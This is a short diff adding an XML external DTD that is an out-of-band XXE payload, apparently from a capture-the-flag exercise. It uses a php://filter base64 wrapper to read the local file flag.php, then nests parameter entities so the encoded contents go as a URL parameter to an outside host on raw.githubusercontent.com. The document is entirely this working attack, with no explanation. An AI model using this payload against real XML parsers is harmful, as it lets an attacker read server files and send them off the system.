@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:/flag.php">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://raw.githubusercontent.com/Emoth97/rjaqyl/master/get.php?file=%payload;'>">
+%int;
+%trick;
